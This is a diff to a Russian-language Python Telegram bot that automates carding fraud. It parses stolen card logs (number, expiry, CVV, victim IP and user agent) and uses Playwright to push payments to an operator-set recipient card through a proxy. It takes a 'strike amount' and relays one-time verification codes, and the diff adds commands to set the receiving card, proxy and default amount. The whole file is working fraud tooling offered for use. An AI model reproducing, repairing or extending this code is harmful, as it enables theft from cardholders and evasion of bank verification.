@@ -1,8 +1,4 @@
-import os
-import re
-import sqlite3
-import asyncio
-import random
+import os, re, sqlite3, asyncio
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
@@ -12,35 +8,28 @@ from playwright.async_api import async_playwright
 from flask import Flask
 import threading
 
-# ===================== КОНФИГ =====================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DB_PATH = "/var/data/sessions.db"
 
-# ===================== FLASK ДЛЯ ПИНГА =====================
+# ========== FLASK ==========
 app = Flask(__name__)
-
 @app.route('/ping')
-def ping():
-    return "OK", 200
-
-def run_flask():
-    app.run(host='0.0.0.0', port=10000)
-
+def ping(): return "OK", 200
+def run_flask(): app.run(host='0.0.0.0', port=10000)
 threading.Thread(target=run_flask, daemon=True).start()
 
-# ===================== БОТ =====================
+# ========== БОТ ==========
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
 
-# ===================== КНОПКИ МЕНЮ =====================
 def get_main_menu():
     kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
     return kb
 
-# ===================== БАЗА ДАННЫХ =====================
+# ========== БАЗА ==========
 def init_db():
     os.makedirs("/var/data", exist_ok=True)
     conn = sqlite3.connect(DB_PATH)
@@ -115,7 +104,7 @@ def get_session(session_id):
     conn.close()
     return row
 
-# ===================== ПАРСЕР ЛОГА =====================
+# ========== ПАРСЕР ==========
 def parse_log(text):
     data = {"card": None, "expiry": None, "cvv": None, "ip": None, "user_agent": None}
     lines = text.split("\n")
@@ -136,14 +125,15 @@ def parse_log(text):
             parts = line.split(":", 1)
             if len(parts) > 1: data["user_agent"] = parts[1].strip()
     if not data["ip"]: data["ip"] = get_setting('proxy') or "auto"
-    if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36"
+    if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
     return data
 
-# ===================== ЭМУЛЯЦИЯ ПЛАТЕЖА =====================
+# ========== ЭМУЛЯЦИЯ ==========
 async def emulate_payment(session_id, code=None):
     session = get_session(session_id)
     if not session: return "Сессия не найдена"
     card, expiry, cvv, ip, ua, amount, card_to = session[1], session[2], session[3], session[4], session[5], session[6], session[7]
+    if not card_to: return "❌ Карта получателя не задана! Используй /set_card"
     expiry = expiry.replace("/", "").strip()
     if len(expiry) == 4: expiry = expiry[:2] + "/" + expiry[2:]
     proxy = get_setting('proxy')
@@ -175,11 +165,35 @@ async def emulate_payment(session_id, code=None):
         error_text = await page.text_content('.error')
         return f"❌ Ошибка: {error_text or 'неизвестная'}"
 
-# ===================== ОБРАБОТЧИКИ =====================
+# ========== КОМАНДЫ ==========
 @dp.message_handler(commands=['start'])
 async def start_cmd(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
-    await msg.reply("🏦 Бот активирован. Шли лог с данными карты.", reply_markup=get_main_menu())
+    await msg.reply("🏦 Бот активирован. Шли лог.", reply_markup=get_main_menu())
+
+@dp.message_handler(commands=['set_card'])
+async def set_card(msg: types.Message):
+    if msg.from_user.id != ADMIN_ID: return
+    parts = msg.text.split()
+    if len(parts) < 2: await msg.reply("❌ Используй: /set_card 5168755432101234"); return
+    set_setting('card_to', parts[1])
+    await msg.reply(f"✅ Карта получателя: {parts[1]}")
+
+@dp.message_handler(commands=['set_proxy'])
+async def set_proxy(msg: types.Message):
+    if msg.from_user.id != ADMIN_ID: return
+    parts = msg.text.split()
+    if len(parts) < 2: await msg.reply("❌ Используй: /set_proxy socks5://user:pass@ip:port"); return
+    set_setting('proxy', parts[1])
+    await msg.reply("✅ Прокси обновлён")
+
+@dp.message_handler(commands=['set_amount'])
+async def set_amount(msg: types.Message):
+    if msg.from_user.id != ADMIN_ID: return
+    parts = msg.text.split()
+    if len(parts) < 2 or not parts[1].isdigit(): await msg.reply("❌ Используй: /set_amount 5000"); return
+    set_setting('default_amount', parts[1])
+    await msg.reply(f"✅ Сумма по умолчанию: {parts[1]} UAH")
 
 @dp.message_handler(lambda msg: msg.text == "🏠 Главное меню")
 async def main_menu(msg: types.Message):
@@ -187,12 +201,13 @@ async def main_menu(msg: types.Message):
     await msg.reply("🏠 Главное меню. Отправьте лог.", reply_markup=get_main_menu())
 
 @dp.message_handler(lambda msg: msg.text == "⚙️ Админ-панель")
-async def admin_panel_button(msg: types.Message):
+async def admin_panel(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
-        InlineKeyboardButton("💳 Сменить карту", callback_data="change_card"),
-        InlineKeyboardButton("🔄 Сменить прокси", callback_data="change_proxy"),
+        InlineKeyboardButton("💳 Карта", callback_data="change_card"),
+        InlineKeyboardButton("🔄 Прокси", callback_data="change_proxy"),
+        InlineKeyboardButton("💰 Сумма", callback_data="change_amount"),
         InlineKeyboardButton("📋 Статус", callback_data="show_status"),
     )
     await msg.reply("🏦 Админ-панель", reply_markup=kb)
@@ -200,7 +215,7 @@ async def admin_panel_button(msg: types.Message):
 @dp.callback_query_handler(lambda c: c.data.startswith("change_"))
 async def settings_callback(callback: types.CallbackQuery):
     action = callback.data.split("_")[1]
-    prompts = {"card": "Введите новый номер карты получателя:", "proxy": "Введите новый прокси (socks5://user:pass@ip:port):"}
+    prompts = {"card": "Введите новый номер карты получателя:", "proxy": "Введите новый прокси:", "amount": "Введите сумму по умолчанию (UAH):"}
     await callback.message.reply(prompts.get(action, "Ошибка"))
     await callback.answer()
 
@@ -208,21 +223,20 @@ async def settings_callback(callback: types.CallbackQuery):
 async def show_status(callback: types.CallbackQuery):
     card = get_setting('card_to') or "не задана"
     proxy = get_setting('proxy') or "не задан"
-    await callback.message.reply(f"📊 Настройки:\n💳 Карта: {card}\n🔄 Прокси: {proxy}")
+    amount = get_setting('default_amount') or "не задана"
+    await callback.message.reply(f"📊 Настройки:\n💳 Карта: {card}\n🔄 Прокси: {proxy}\n💰 Сумма: {amount} UAH")
     await callback.answer()
 
+# ========== ОБРАБОТКА ОТВЕТОВ ==========
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
 async def handle_reply(msg: types.Message):
     text = msg.reply_to_message.text
     user_input = msg.text.strip()
 
-    # Если ответ на запрос суммы
-    if "сумму удара" in text:
-        if not user_input.isdigit():
-            await msg.reply("❌ Введи число!")
-            return
+    # Проверяем, является ли ответ числом
+    if user_input.isdigit() and "сумму удара" in text:
         amount = int(user_input)
-        # Ищем сессию по msg_id сообщения, на которое отвечаем
+        # Ищем сессию по ID сообщения, на которое ответили
         session = get_session_by_msg(msg.reply_to_message.message_id)
         if not session:
             await msg.reply("❌ Сессия не найдена. Отправь лог заново.")
@@ -230,7 +244,7 @@ async def handle_reply(msg: types.Message):
         session_id = session[0]
         update_session(session_id, 'amount', amount)
         update_session(session_id, 'status', 'processing')
-        await msg.reply(f"🚀 Начинаю платёж на {amount} UAH...")
+        await msg.reply(f"🚀 Платёж на {amount} UAH...")
         result = await emulate_payment(session_id)
         if result == "waiting_code":
             update_session(session_id, 'status', 'waiting_code')
@@ -241,11 +255,8 @@ async def handle_reply(msg: types.Message):
             await msg.reply(result)
         return
 
-    # Если ответ на запрос кода
-    if "код" in text:
-        if not user_input.isdigit() or len(user_input) != 6:
-            await msg.reply("❌ 6 цифр!")
-            return
+    # Если ответ — 6 цифр и есть запрос кода
+    if user_input.isdigit() and len(user_input) == 6 and "код" in text:
         session = get_session_by_msg(msg.reply_to_message.message_id)
         if not session:
             await msg.reply("❌ Сессия не найдена.")
